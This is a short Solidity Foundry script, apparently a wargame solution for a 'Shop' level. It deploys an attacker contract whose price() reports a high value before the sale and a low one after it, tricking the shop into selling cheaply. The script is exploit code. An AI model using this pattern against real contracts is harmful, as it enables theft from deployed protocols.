// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Shop, Buyer} from "../src/Level21.sol";

contract Attacker is Buyer {
    Shop level;

    constructor(address level_) {
        level = Shop(level_);
    }

    function price() external view returns (uint256) {
        return level.isSold() ? 1 : 100;
    }

    function attack() external {
        level.buy();
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x217464Bcc60Ae344273201a91E6568486c3a07EA;

        Attacker attacker = new Attacker(levelAddr);

        attacker.attack();

        vm.stopBroadcast();
    }
}
